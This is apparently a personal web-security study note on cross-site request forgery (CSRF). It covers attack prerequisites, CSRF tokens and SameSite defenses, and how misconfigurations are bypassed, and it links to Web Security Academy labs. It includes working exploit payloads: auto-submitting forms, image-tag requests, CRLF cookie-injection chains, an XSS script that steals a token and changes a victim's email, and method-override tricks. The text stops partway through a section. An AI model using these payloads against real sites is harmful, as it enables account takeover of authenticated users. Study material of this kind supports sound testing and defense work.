---
created: 2026-05-14
tags:
  - web_hacking
  - client-side
status: substantial
---
## CSRF

>**CSRF (Cross-Site Request Forgery)** is a web application vulnerability that allows an attacker to induce an authenticated victim's browser into issuing an unintended, state-changing HTTP request to a target application, without the victim's knowledge or consent.

>[!important]+ Classification
> - CSRF map to:
> 	- [`CWE-352: Cross-Site Request Forgery (CSRF)`](https://cwe.mitre.org/data/definitions/352.html)

- CSRF is fundamentally an **impersonation attack**, but not a credential-theft attack.
- The attacker never touches the victim's session cookie, or token, password, or any other credential. 
- Instead, they exploit the fact that browsers attach **ambient credentials** — most commonly session cookies — to *every request* destined to the associated origin, regardless of which page or script triggered that request. 

- From the server's point of view, a request forged by an attacker's page and a request submitted by the victim's own form are byte-for-byte identical. Both carry the same cookie. The server has no native way to tell them apart (unless it implements robust CSRF defenses).

>[!note] CSRF vs. session hijacking
>- In session hijacking, the attacker steals the session credential (session ID or token) of the target user and reuses it directly.
>- In CSRF, the attacker never sees the credential — they just _cause the browser that holds it_ to fire a request.

- To defend against CSRF, each state-changing request must have a parameter that can't be predicted by an attacker without actual credentials.   

>[!note] CSRF is sometimes called **sea-surf** (phonetic) or **one-click attack**.

> [!note] CSRF was on the OWASP Top 10 list until 2017, when it was dropped — not because it disappeared, but because most major frameworks began shipping built-in defenses. Today, exploiting CSRF almost always means **bypassing an existing mitigation**, not exploiting a completely unprotected application.

>[!note] See [[CSRF cheat sheet]].
### Prerequisite conditions

For a CSRF attack against a given endpoint to be feasible, four conditions must hold simultaneously. The absence of any single one of them makes the attack impossible.

- **Presence of a state-changing action**
	- The target application exposes a *state-changing* action that produces meaningful server-side effect and can be triggered via an HTTP request.
	- Examples include:
		- Changing email address, password, or username.
		- Transferring funds or making payments.
		- Adding or removing users; changing roles or permissions.
		- Posting content, deleting records, submitting forms.
		- Creating new accounts or API keys.
		- Enabling/disabling security settings (e.g., 2FA).

>[!note] Read-only operations (e.g., viewing a page, fetching a resource) have no value for CSRF — the attacker needs the server to *do something*.

- **Cookie-based (ambient) authentication**
	- The application authenticates requests using credentials that the browser attaches automatically — most commonly **session cookies**, but also can be HTTP Basic Auth, TLS client certificates, or NTLM. 
	- The credential must be **ambient**: it is included in requests automatically without any explicit action from the user or the JavaScript on the originating page.


>[!note] This means the requests used to perform the action is **self-contained** — it carries authentication by itself, independent of its origin. This way, server can't distinguish a request fired by the victim's own page from the one fired by an attacker's page — if both carry the same session cookie, they look identical.

- **The victim is authenticated and authorized**
	- The victim user has an active session with the target application at the time the attack fires (the browser attaches the session cookie only if it exists).
	- The victim must also hold sufficient privileges to carry out the target action (e.g., forging an administrative action is only meaningful if the target user is an admin).

- **All request parameters are predictable**
	- The state-changing request doesn't contain any parameters an attacker can't fetch or predict.
	- If any parameter value is unknown and cannot be guessed (e.g., the current password required to change the password, a CAPTCHA value, or a properly implemented CSRF token), the attack fails.

>[!important] CSRF exploits via HTML `<form>` submissions are limited to `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain` content types. See [[🛠️ CORS]].
## Basic CSRF (no defenses)

- Basic CSRF attack workflow looks like this:
	
	1. Find a meaningful state-changing action (e.g., email change functionality).
	
	2. Construct an exploit that silently triggers the target HTTP request when visited by the victim. You'll typically include the exploit in a page on your controlled domain.
	
	3. Make the victim visit your exploit page, such as using phishing, malicious advertisement, etc.
	
	4. As soon as the victim visits the page, their browser dispatches a request to the target application, automatically including relevant ambient credentials (e.g., session cookies or token) in that request.


>[!example]- Example: Vulnerable state-changing request
> ```http
> POST /account/change-email HTTP/1.1
> Host: example.com
> Cookie: session=3vYkgz1umkGI9HaBIUyK7z8OCuaxVGzE
> Content-Length: 23
> Content-Type: application/x-www-form-urlencoded
> 
> email=user%40example.com
> ```

Payloads for CSRF with no defenses:

- `GET`-based CSRF:

```html
<!-- image tag -->
<img src="https://example.com/my-account/change-email?email=pwned%40example.com" width="0" height="0">
```

```html
<!-- link auto-clicked via JS -->
<a id="x" href="https://example.com/my-account/change-email?email=pwned%40example.com"></a>
<script>document.getElementById('x').click();</script>
```

- `POST`-based CSRF (auto-submit form):

```html
<html>
    <body>
        <form action="https://example.com/account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@email.com" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

> [!note] The form's `action` attribute points to the **target origin** (the vulnerable app). The form itself is hosted on the **attacker's origin**. This is possible because the [[SOP]] allows *sending* cross-origin requests (but not reading the responses to such requests).

> [!important] CSRF attacks are blind. 
>- The attacker triggers the request but **never receives the server's response**. The HTTP response travels back to the victim's browser. 
>- This means that CSRF can't be used to exfiltrate data — only trigger actions.
>- To confirm successful exploitation, there must be out-of-band signals (e.g., the victim's email address changes, a transaction appears in their account, etc.).

>[!note] See [`Cross-Site Request Forgery — PayloadsAllTheThings`](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Cross-Site%20Request%20Forgery/README.md).
## Defenses and how to bypass them

In practice, exploiting CSRF today nearly always involves bypassing at least one type of defense. Among the most common ones are:

- **CSRF tokens**
	- Unpredictable per-session values that must be submitted with every state-changing request; address the *predictability condition* ([[#Prerequisite conditions]]).

- **`SameSite` cookie attribute**
	- Browser-enforced restriction that controls when cookies are sent with cross-site requests; addresses the *ambient credential* condition ([[#Prerequisite conditions]]).

- **`Referer` or `Origin` header validation**
	- Server-side validation of HTTP readers that report the requests's origin; addresses the *cross-site origin* itself.

Correctly implemented in combination, they provide strong defense in depth — but each can be misconfigured independently, and misconfiguration is common.
## CSRF tokens

### How CSRF tokens work

> A **CSRF token** is a cryptographically random, server-generated, per-session (or per-request) secret value that the client must echo back on every state-changing request.

- The token is embedded as a hidden form field (or custom header for AJAX) and included in the user's request:

```html
<form action="https://example.com/account/change-email" method="POST">
	<input type="email" name="email" value="user@example.com" />
	<input type="hidden" name="csrf_token" value="090045b39012f57bb732ca0b9ea9bd05" />
	<button type="submit">Update</button>
</form>
```

```http
POST /account/change-email HTTP/1.1
Host: example.com
Cookie: session=3vYkgz1umkGI9HaBIUyK7z8OCuaxVGzE
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

email=email%40email.com&csrf_token=090045b39012f57bb732ca0b9ea9bd05
```

- When a client issues a request, the application must verify the existence *and* validity of the token in the request. If the token is invalid or not present at all, the request should be rejected. 

- The attacker does can construct an exploit that triggers an arbitrary forged request, but they can't guess a CSRF token that is both cryptographically random and tied to a session they don't control — assuming the implementation is sound.


> [!important] Properties required for a CSRF token to work properly
> 
> - **Cryptographically random** with ≥128 bits of entropy, generated by a [CSPRNG](https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator) (Cryptographically Secure Pseudorandom Number Generator) — never derived from predictable values like timestamps, usernames, or sequential counters. 
> - **Bound to the user's session** (see [[#Bypassing CSRF token validation]]).
> - **Validated on every state-changing request, server-side**, independent of HTTP request method. 
> - **Never transmitted in cookies or URLs** — a cookie with a CSRF token would be treated as an ambient credential and submitted automatically by the browser, just like session cookies; URLs are leaked into the browser history, server access logs, proxy/CDN logs, and the `Referer` header send to third-party resources loaded from the same page. 
> - Ideally **expired** after a reasonable time window or invalidated on first use (a per-request).

> [!note] Per-session vs. per-request tokens 
> - A **per-session token** is issued once at login and reused for every subsequent state-changing request during that session. 
> - A **per-request token** is regenerated after every use. 
> 
> Per-request tokens are more secure — a leaked token (via Referer leakage, logs, [[XSS]]) is only useful for one action. However, they cost more engineering effort, since every form on every page needs a fresh value; multi-tab navigation and back buttons must be handled carefully, too.

>[!interesting] What prevents CSRF tokens themselves being read off the page with the target form is the **[[ SOP | SOP (Same-Origin Policy) ]]**. Scripts hosted on one origin (e.g., attacker's domain) can't read the contents of a pages hosted on another origin (e.g., target website).

>[!note] In AJAX requests, CSRF tokens can be transmitted in custom request headers
> 
> ```javascript
> // frontend sends token in a custom header
> fetch('/api/update-profile', {
>   method: 'POST',
>   headers: {
>     'X-CSRF-Token': document.querySelector('meta[name="csrf-token"]').content,
>     'Content-Type': 'application/json'
>   },
>   body: JSON.stringify({ email: 'user@example.com' })
> });
> ```
> Custom headers work because cross-site `fetch()`/`XMLHttpRequest()` calls can't set arbitrary custom headers without triggering a [[🛠️ CORS]] preflight (which CORS then blocks unless the target explicitly allows it).
### Bypassing CSRF token validation

- CSRF tokens are frequently implemented incorrectly. The most common misconfigurations include:
	- **Validation depends on the HTTP method** — bypass using a `GET` request.
	- **Validation depends on the token being present** — bypass using a request with no token parameter.
	- **The token is not tied to the user's session** — bypass by submitting a request with a valid token of another user. 
	- **The token is tied to a non-session cookie**
	- **Double-submit cookie pattern**
	- **CSRF token bypass via XSS**
#### Validation depends on the HTTP method

>[!bug] The server validates the CSRF token for `POST` but not for `GET`, `PUT`, `DELETE`, or `PATCH`. 

- Even if developers do not explicitly implement handling requests via `GET`, if the accepted HTTP methods are not restricted, the underlying framework may process state-changing `GET` requests by default — with no CSRF validation enforced. 

- How to test:
	1. Capture a legitimate `POST` request of the target action (in Burp, `Send to Repeater`). 
	2. Change the request method to `GET` (in Burp, right-click the request -> `Change request method`).
	3. Modify the token, e.g.:
		- Submit an invalid token
		- Set the token to an empty value
		- Remove the token entirely
	4. Send the request and observe whether the action succeeds.

>[!example]-
> - Original request:
> 
> ```HTTP
> POST /my-account/change-email HTTP/2
> Host: 0a2b004203a6642180c4032600d70082.web-security-academy.net
> Cookie: session=Pma6QqeQKwCgoR6rUbVXJN6vYu0EPJsI
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 40
> 
> email=pwned0%40example.com&csrf=090045b39012f57bb732ca0b9ea9bd05
> ```
> 
> ![[change_request_method.png]]
> 
> - Converted to `GET`:
> 
> ```http
> GET /my-account/change-email?email=pwned0%40example.com&csrf=anything HTTP/2
> Host: 0a2b004203a6642180c4032600d70082.web-security-academy.net
> Cookie: session=Pma6QqeQKwCgoR6rUbVXJN6vYu0EPJsI
> ```
> - Copy URL:
>
>![[copy_url.png]]

- CSRF payloads — `GET` request bypass:

```html
<img src="https://example.com/my-account/change-email?email=pwned%40example.com&csrf=anything">
```

>[!bug]+ Labs
>- [[🛠️ CSRF labs#2. CSRF where token validation depends on request method|2. CSRF where token validation depends on request method]]
#### Validation depends on the token being present

>[!bug] The server validates the CSRF token value when if the parameter is included in the request, but takes **no action** — and raises no error — **if the parameter is missing entirely**.

> [!example]- Example: Vulnerable Python code (Flask)
> ```python
> if 'csrf_token' in request.POST:
> 	CSRF_token = request.POST.get('csrf_token')
>     if CSRF_token != session.csrf_token:
>         return 403
> # no token? no problem — processing continues
> process_request()
> ```

- How to test:
	1. Capture a legitimate `POST` request of the target action (in Burp, `Send to Repeater`). 
	2. Delete the CSRF token parameter entirely from the body (not just set to empty; remove the parameter itself).
	3. Send the request and observe whether the action succeeds.

>[!example]-
> - Original request:
> 
> ```http
> POST /my-account/change-email HTTP/2
> Host: example.com
> Cookie: session=Pma6QqeQKwCgoR6rUbVXJN6vYu0EPJsI
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 40
> 
> email=pwned0%40example.com&csrf=090045b39012f57bb732ca0b9ea9bd05
> ```
> 
> - Th `csrf` parameter removed:
> 
> ```http
> POST /my-account/change-email HTTP/2
> Host: example.com
> Cookie: session=Pma6QqeQKwCgoR6rUbVXJN6vYu0EPJsI
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 40
> 
> email=pwned0%40example.com
> ```

- If the bypass works, deliver the exploit:

```html
<html>
    <body>
        <form action="https://example.com/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@example.com" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

>[!bug]+ Labs
>- [[🛠️ CSRF labs#3. CSRF where token validation depends on token being present|3. CSRF where token validation depends on token being present]]
#### The token is not tied to the user's session

> [!bug] Rather than binding each token to the specific session that received it, the application maintains a shared pool of issued tokens and accepts _any_ token present in that pool, regardless of which user it was originally handed to.

- How to test:
	1. Capture a legitimate `POST` request of the target action (in Burp, `Send to Repeater`). 
	2. Change a session cookie or token in the request to the one that belongs to another user, leaving the original CSRF token intact.
	3. Send the request and observe whether the action succeeds.
- Alternatively, you can capture two request from two different accounts, swap the token between them (keeping each request's own session cookie) and see if both are still accepted.

>[!warning]+ Testing requires two accounts, **both with an active session at time of test**.
>- Logging out of the source account after capturing the request may invalidate the token before you can reuse it, and the test will fail (given that the application implements the invalidation mechanism correctly).

>[!example]-
> - Original request:
> 
> ```http
> POST /my-account/change-email HTTP/2
> Host: example.com
> Cookie: session=ATTACKER_SESSION_COOKIE
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 40
> 
> email=pwned0%40example.com&csrf=090045b39012f57bb732ca0b9ea9bd05
> ```
> 
> - Th `csrf` parameter removed:
> 
> ```http
> POST /my-account/change-email HTTP/2
> Host: example.com
> Cookie: session=VICTIM_SESSION_COOKIE
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 40
> 
> email=pwned1%40example.com&csrf=090045b39012f57bb732ca0b9ea9bd05
> ```

- Deliver the exploit with your own CSRF token (while still having an active session in the application):

```html
<html>
    <body>
        <form action="https://example.com/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@example.com" />
            <input type="hidden" name="csrf" value="ATTACKER_OWN_VALID_TOKEN" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

>[!bug]+ Labs
>- [[🛠️ CSRF labs#4. CSRF where token is not tied to user session|4. CSRF where token is not tied to user session]]
#### The token is tied to a non-session cookie

>[!bug] The application correctly binds the token to _a_ cookie, but that cookie is a separate, non-session cookie issued by a different component of the stack.

- Instead of tying the CSRF token to a session cookie, the application introduces another, non-session cookie, and binds the token to that cookie. 
- You can bypass this if you can force the victim's browser **set cookies of your choice**.

>[!interesting] This flaw commonly occurs when an application employs two different frameworks at the same time, one for session handling and one for CSRF protection, which are not integrated together. 

>[!example]+
> - Example request:
> 
> ```http
> POST /my-account/change-email HTTP/2
> Host: 0a2b004203a6642180c4032600d70082.web-security-academy.net
> Cookie: session=Pma6QqeQKwCgoR6rUbVXJN6vYu0EPJsI; csrftoken=0a2b004203a6642180c4032600d70082
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 40
> 
> email=pwned0%40example.com&csrf=090045b39012f57bb732ca0b9ea9bd05
> ```

- How to test:
	1. Capture a legitimate `POST` request of the target action (in Burp, `Send to Repeater`). 
	2. Observe the request has two cookies: one is session cookie, another is used to validate CSRF.
	3. Change a session cookie or token in the request to the one that belongs to another user, leaving the original CSRF token and the non-session cookie intact.
	4. Send the request and observe whether the action succeeds.
	5. If yes, continue continue testing. Find a vulnerability in the application that allows you to force the victim's browser to set arbitrary cookies (e.g., a CRLF injection or subdomain cookie injection vulnerability).
	6. Construct an exploit that first sets the non-session cookie used to validate the CSRF request to the value generated for your account, and then submits a request with your CSRF token.  

- Test the exploit:

```html
<html>
	<!-- set the csrfKey cookie using a CRLF injection vulnerability (in this case, via a GET request with %0D%0A followed by the Set-Cookie HTTP header a the URL query parameter) -->
	<img src="https://example.com/?search=test%0D%0ASet-Cookie:%20csrfKey=YOUR_NON_SESSION_COOKIE%3B%20SameSite=None">
	
	<!-- submit a request that includes a CSRF token valudated against the non-session cookie just set -->
    <body>
        <form action="https://example.com/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@examaple.com" />
            <input type="hidden" name="csrf" value="YOUR_CSRF_TOKEN">
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

> [!example]-
> ```html
> <html>
> 	<img src="https://0a2c00b8035e9291805e03b200260033.web-security-academy.net/?search=test%0D%0ASet-Cookie:%20csrfKey=LeJ3Bo4q1hY16DiReSayLtPLJRNiZXsC%3B%20SameSite=None">
>     <body>
>         <form action="https://0a2c00b8035e9291805e03b200260033.web-security-academy.net/my-account/change-email" method="POST">
>             <input type="hidden" name="email" value="pwned1@examaple.com" />
>             <input type="hidden" name="csrf" value="jsiE7Pcdzw96hjlvCfMYJKpfvz5zoEM6">
>         </form>
>         <script>
>             document.forms[0].submit();
>         </script>
>     </body>
> </html>
> ```

>[!bug]+ Labs
>- [[🛠️ CSRF labs#5. CSRF where token is tied to non-session cookie|5. CSRF where token is tied to non-session cookie]]

#### Double-submit cookie pattern

>[!bug] An incorrectly-implemented **double-submit cookie pattern**. The application issues a CSRF token **as a cookie** *and* **expects the same value echoed back as a request parameter or header**. A request is accepted if and only if the two values match exactly. 

- The double-submit cookie pattern frees the application from the need to persist any per-session token state at all — the application simply compares the cookie and parameter values in the request, and passes the check if those match. 
- However, in absence of proper cookie integrity checks, when the application and relies on an assumption that a user will never modify their cookies manually, you can bypass the validation — given that you control cookies.

>[!example]+
> ```http
> POST /my-account/change-email HTTP/2
> Host: example.com
> Cookie: session=Pma6QqeQKwCgoR6rUbVXJN6vYu0EPJsI; csrf=090045b39012f57bb732ca0b9ea9bd05
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 40
> 
> email=pwned0%40example.com&csrf=090045b39012f57bb732ca0b9ea9bd05
> ```

- How to test:
	1. Capture a legitimate `POST` request of the target action (in Burp, `Send to Repeater`). 
	2. Set the CSRF token parameter to an arbitrary value of your choice, for example, `csrftoken=attacker123`.
	3. Set the CSRF token cookie to the same value.
	4. Send the request and observe whether the action succeeds.
	5. If yes, continue continue testing. Find a vulnerability in the application that allows you to force the victim's browser to set arbitrary cookies (e.g., a CRLF injection or subdomain cookie injection vulnerability).
	6. Construct an exploit that first sets the CRLF cookie to the value of your choice, and then submits a request with the CSRF token parameter set to the same value as the cookie.

- Test the exploit:

```html
<html>
	<img src="https://example.com/?search=test%0D%0ASet-Cookie:%20csrf=attacker123%3b%20SameSite=None">
    <body>
        <form action="https://0acd00b3037d876280f630c800f800f2.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned1@examaple.com" />
            <input type="hidden" name="csrf" value="attacker123">
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

> [!note] A correctly implemented double-submit pattern adds the `__Host-` cookie prefix and/or signs the cookie value with an HMAC keyed to the session, which prevents the attacker from forging an arbitrary value even if they can inject _some_ cookie. Always check if the cookie value is a signed/structured blob (suggests it's HMAC-protected).

>[!bug]+ Labs
>- [[🛠️ CSRF labs#6. CSRF where token is duplicated in cookie|6. CSRF where token is duplicated in cookie]]

#### CSRF token bypass via XSS

- **[[XSS]] (Cross-Site Scripting)** attacks can bypass CSRF token protection entirely since they allow you to **read the token directly from the page** using it to forge requests.

- This works because CSRF tokens are usually embedded directly in HTML forms, and JavaScript has access to the DOM. 

>[!note] XSS bypasses the [[SOP]] because the script runs in the context of the target website (origin).

- Example exploit:

```html
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account', true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@example.com');
};
</script>
```

>[!note]+ Code breakdown
>- `var req = new XMLHttpRequest();` creates an `XMLHttpRequest` object, `req`. This request fetches the `/my-account` page so `handleResponse()` later parses the page to extract the CSRF token. This is possible because the request is **same-origin** (if you tried to read the contents of a page on another origin, you'd be stopped by the [[SOP]]).
>	- `req.onload = handleResponse;` sets a callback function (`handleResponse`) to execute as soon as the response is received. 
>	- `req.open('get', '/my-account', true);` configures a `GET` request to `/my-account` (asynchronous).
>	- `req.send();` sends the request to fetch the page. 
>- `function handleResponse() { ... }` defines the function that processes the response (`handleResponse` set earlier). It's responsible for retrieving the CSRF from the response and triggering the CSRF attack (sending the state-changing request the CSRF targets). 
>	- `var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];` uses a **regex** to extract the CSRF token from the HTML response. The pattern `name="csrf" value="(\w+)"` captures the token value.
>	- `var changeReq = new XMLHttpRequest();` creates a new request to submit the forged form. 
>	- `changeReq.open('post', '/my-account/change-email', true);` configures a `POST` request to `/my-account/change-email` (the action this CSRF attack targets).
>	- `changeReq.send('csrf=' + token + '&email=test@example.com');` sends the a request (executes CSRF) with the **stolen CSRF token** and a new email (`test@example.com`). 

>[!note] Classic CSRF requires tricking the victim into clicking a link, but XSS-based CSRF can be delivered silently (for example, via [[🛠️ Web Cache Poisoning]] or if it's a stored XSS).

>[!bug]+ Labs 
>- [[🛠️ XSS labs#24. Exploiting XSS to bypass CSRF defenses]].
## `SameSite` cookie attribute

### How `SameSite` cookies work

>The **`SameSite` cookie attribute** is a browser-enforced security directive set by the server, that constraints whether that cookie is attached to requests whose initiating page lives on a different *site* than the cookie's owning domain.

>[!note]+ A **site** is a combination of the URI scheme and the **effective Top-Level Domain +1 (eTLD+1)** — the registered domain including its public suffix.
>![[origin_and_site.svg]]
>
>See [[SOP#Site]].

The `SameSite` cookie attribute can be set to `Strict`, `Lax`, or `None`.

- **`SameSite=Strict`**
	- Cookies are sent **only in same-site contexts**.
	- Cookies are **never included in cross-site requests**, including:
		- Top-level navigation (e.g., clicking a link from another site).
		- Cross-site form submissions.
		- Cross-site AJAX / `fetch()` / XHR requests.
		- Requests from embedded content (`iframe`, `img`, `script`, etc.)
	- This provides the strongest CSRF protection because browsers never attach the cookie to requests initiated from another site.
	- However, it can negatively affect usability and authentication flows, such as federated login / SSO, OAuth redirect  flows, email login links, external deep links, etc.

```HTTP
Set-Cookie: sessionid=abc123; SameSite=Strict; Secure; HttpOnly
```

>[!important]+ A **cross-site request** is a request initiated from one site to a different site.

- **`SameSite=Lax`**
	- Cookies are sent in:
		- **Same-site requests**
		- **Cross-site top-level navigation** requests using **safe HTTP methods** (`GET`, `HEAD`, `OPTIONS`, `TRACE`).
		- Top-level redirects (`301`, `302`, `303`, and sometimes `307`/`308` depending on the resulting request method).
	- Cookies are **not sent with**:
		- Cross-site requests using **unsafe HTTP methods** (`POST`, `PUT`, `DELETE`, `PATCH`).
		- Cross-site AJAX / `fetch()` / XHR requests.
		- Embedded resources (`iframe`, `img`, `script`, etc.) from another site.
		- Requests from embedded content (`iframe`, `img`, `script`, etc.)
	- `Lax` is designed to balance security and usability:
		- Users can still follow normal links between websites with cookies attached to the requests. 
		- Most CSRF attacks that use hidden forms or background requests are blocked.
	- Most modern browsers **default to `Lax`** if no `SameSite` attribute is specified.

```HTTP
Set-Cookie: sessionid=abc123; SameSite=Lax; Secure; HttpOnly
```

>[!note] This is one of the reasons why state-changing actions via `GET` requests is a bad idea — the default `Lax` would permit CSRF (see [[#Bypassing SameSite=Lax restrictions using GET requests]]). 

>[!important] Newly added cookies may still be sent with cross-site top-level `POST` requests for a short period (commonly around 2 minutes). 
>- This behavior is **browser-dependent** and applies mainly to cookies that omitted `SameSite`; it for compatibility with legacy login flows. 
>- This is why explicitly setting `SameSite=Lax` is preferable to relying on browser defaults.
>
>See [[#Bypassing SameSite Lax restrictions with newly issued cookies]].

- **`SameSite=None`**
	- Cookies are sent in **all contexts**, including:
		- Cross-site requests (using safe and unsafe HTTP methods).
		- AJAX / `fetch()` / XHR requests.
		- Embedded resources (`iframe`, `img`, `script`, etc.) and third-party content.
	- This disables `SameSite` protections entirely.
	- Modern browsers require `SameSite=None` cookies to also carry the `Secure` attribute (HTTPS-only); otherwise, the cookie is rejected.

```HTTP
Set-Cookie: sessionid=abc123; SameSite=None; Secure; HttpOnly
```

| Request Type                                                | `Strict`   | `Lax`              | `None; Secure` |
| ----------------------------------------------------------- | ---------- | ------------------ | -------------- |
| Same-site navigation (any method)                           | `✓` Sent   | `✓` Sent           | `✓` Sent       |
| Cross-site top-level `GET` (link click)                     | ❌ Not sent | `✓` Sent           | `✓` Sent       |
| Cross-site top-level `POST` (form submission)               | ❌ Not sent | ❌ Not sent         | `✓` Sent       |
| Cross-site AJAX / `fetch()` / XHR                           | ❌ Not sent | ❌ Not sent         | `✓` Sent       |
| Embedded resource loading (`<img>`, `<script>`, `<iframe>`) | ❌ Not sent | ❌ Not sent         | `✓` Sent       |
| Cross-site WebSocket handshake                              | ❌ Not sent | ❌ Usually not sent | `✓` Sent       |

>[!note] A **top-level navigation** occurs when the browser loads a new document in the main browser tab or window, such as clicking a link, typing a URL, or opening a bookmark. 
>- This differs from **subresource request**, which load additional resources without changing the main page. Subresource requests include AJAX / `fetch()` requests and embedded resource loading (`<img>`, `<script>`, `<iframe>`)

#### Default browser behavior

**The majority of modern browsers set `SameSite` to `Lax` by default.**
- **Chrome**
	- Since **Chrome 80 (2020)**, Chrome treats cookies **without a SameSite attribute as `SameSite=Lax` by default**.
	- Cookies set with `SameSite=None` **must also have the `Secure` attribute** (sent only over HTTPS), otherwise they are rejected.
- **Mozilla Firefox**
	- Since version 69, Firefox behaves similarly to Chrome. 
	- Cookies **without an explicit SameSite attribute default to `SameSite=Lax`**.
	- `SameSite=None` cookies require the `Secure` attribute.
- **Safari**
	- Cookies **without a SameSite attribute are treated as `SameSite=None` by default**, meaning cookies are sent on all cross-site requests. This behavior may vary depending on Safari version.
	- Safari’s more permissive default can expose users to more CSRF risk compared to Chromium browsers.
	- Safari also implements **Intelligent Tracking Prevention (ITP)**, which can affect cookie behavior especially for third-party cookies.
- Browsers built on Chromium (e.g., Brave, Opera) follow Chrome’s defaults (`SameSite=Lax` by default).

### Bypassing `SameSite` cookie protection

- There are several common ways to bypass restrictions imposed by `SameSite`:
	- Bypassing `SameSite=Lax` restrictions using `GET` requests
	- Bypassing `SameSite` restrictions using on-site gadgets
	- Bypassing `SameSite` restrictions via vulnerable sibling domains
	- Bypassing `SameSite` Lax restrictions with newly issued cookies

#### Bypassing `SameSite=Lax` restrictions using `GET` requests

- `Lax` permits cookies on cross-site **top-level navigation** using safe methods (`GET`).

>[!note] Top-level navigation happens when you make a `GET` request by clicking a link on a web page.

>[!bug] If the same endpoint that performs the state change also accepts `GET` in addition to (or instead of) `POST`, then a top-level navigation — a link, or a JS-forced `window.location` change — carries the cookie even under `Lax`. This renders `SameSite` useless against CSRF.

- This often happens when the application doesn't explicitly restrict methods and uses the same handlers for `GET` as for `POST`. 

>[!example]-
> - Original request:
> 
> ```HTTP
> POST /my-account/change-email HTTP/2
> Host: 0a2b004203a6642180c4032600d70082.web-security-academy.net
> Cookie: session=Pma6QqeQKwCgoR6rUbVXJN6vYu0EPJsI
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 40
> 
> email=pwned0%40example.com&csrf=090045b39012f57bb732ca0b9ea9bd05
> ```
> 
> ![[change_request_method.png]]
> 
> - Converted to `GET`:
> 
> ```http
> GET /my-account/change-email?email=pwned0%40example.com&csrf=anything HTTP/2
> Host: 0a2b004203a6642180c4032600d70082.web-security-academy.net
> Cookie: session=Pma6QqeQKwCgoR6rUbVXJN6vYu0EPJsI
> ```
> - Copy URL:
>
>![[copy_url.png]]

- How to test:
	1. Capture a legitimate `POST` request of the target action (in Burp, `Send to Repeater`). 
	2. Change the request method to `GET` (right-click the request -> `Change request method` — this also preserves `POST` parameters as `GET` parameters).
	3. Send the request and observe whether the action succeeds.

- Test the exploit:

```html
<script>
	window.location = "https://example.com/my-account/change-email?email=pwned%40example.com"
</script>
```

>[!note] In URL parameters, encode characters that have special meaning in URLs (e.g., `@` becomes `%40`). 

##### HTTP method override

- Some frameworks let a client *claim* a different method than the one actually used on the wire. This is designed for compatibility with HTML forms which can't natively send methods other than `POST` and `GET`, like `PUT` / `DELETE` / `PATCH` / `HEAD`.
- For example, PHP Symphony recognizes `_method` form parameter; many others recognize the `X-HTTP-Method-Override` or `X-Method-Override` headers. 

>[!bug] If the backend trusts a user-controlled override, you can submit a `GET` request and have the server treat it as the protected `POST` — while the browser will still include cookies in the request treating it a top-level navigation.

- This is a workaround that helps with the previous bypass when the application doesn't accept `GET` requests at the form endpoint as-is.

- How to test:
	1. Capture a legitimate `POST` request of the target action (in Burp, `Send to Repeater`). 
	2. Change the request method to `GET` (right-click the request -> `Change request method` — this also preserves `POST` parameters as `GET` parameters).
	3. Use a method-override parameter or header such as the `_method` URL parameter.
	4. Send the request and observe whether the action succeeds.

- Test the exploit:

```html
<script>
	window.location = "https://example.com/my-account/change-email?email=pwned%40example.com&_method=POST"
</script>
```

>[!warning] You can't attach arbitrary HTTP headers a browser top-level navigation (including `window.location`, `<a>`, `<form>`, `<iframe>`), so bypasses relying on `X-HTTP-Method-Override` or `X-Method-Override` are not an option.

>[!warning] **Cross-site `fetch()`** does allow you to control HTTP headers, but **it is not considered a top-level navigation**. `SameSite=Lax` cookies are not included in such request. Even if the server honors `X-HTTP-Method-Override` or `X-Method-Override`, the request will typically be unauthenticated, so the exploit fails.

>[!important] **If you gain JavaScript execution in a same-site origin** (for example via subdomain takeover or XSS on a sibling subdomain), then **`fetch()` requests are same-site** rather than cross-site. In that case, `SameSite=Lax` cookies are sent, so overrides using `X-HTTP-Method-Override` or `X-Method-Override` would be exploitable given that the target honors them. 
> ```html
> <script>
> fetch("https://example.com/change-email?email=pwned%40example.com", {
>     method: "GET",
>     headers: {
>         "X-HTTP-Method-Override": "POST"
>     },
>     credentials: "include"
> });
> </script>
> ```
>- Subdomain takeover or XSS on a sibling domain works because **two websites with the same scheme and eTLD+1 but different subdomains** are considered **same-site**.
>>[!note] See [[#Bypassing SameSite restrictions via vulnerable sibling domains]].

>[!bug]+ Labs
>- [[🛠️ CSRF labs#7. SameSite Lax bypass via method override|7. SameSite Lax bypass via method override]]
#### Bypassing `SameSite` restrictions using on-site gadgets

- `SameSite=Strict` blocks cookies on requests *originating* from another site (e.g., when `attacker.com` initiates a request to `example.com`).
- But if you can get the victim's browser to first land on a page that is itself on the target's site, and *that* page then triggers the target state-changing request, cookies are included — because the request is considered same-site.

